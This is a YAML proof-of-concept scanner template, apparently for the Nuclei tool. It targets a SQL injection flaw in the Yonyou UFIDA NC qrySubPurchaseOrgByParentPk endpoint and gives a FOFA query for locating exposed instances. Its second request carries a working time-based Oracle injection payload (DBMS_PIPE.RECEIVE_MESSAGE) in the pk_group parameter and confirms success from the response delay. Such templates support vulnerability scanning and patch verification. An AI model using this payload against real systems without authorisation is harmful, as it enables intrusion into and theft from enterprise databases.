id: poc-yaml-yonyou-ufida-nc-qrysubpurchaseorgbyparentpk-sqli
info:
  name: 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: ufida-nc
    fofa: app="用友-UFIDA-NC"
variables:
  t1: '{{rand_int(5, 10)}}'
  t2: '{{to_number(t1) + 2}}'
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ufida"
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',{{t1}})--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[]"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
      - type: status
        status:
          - 200
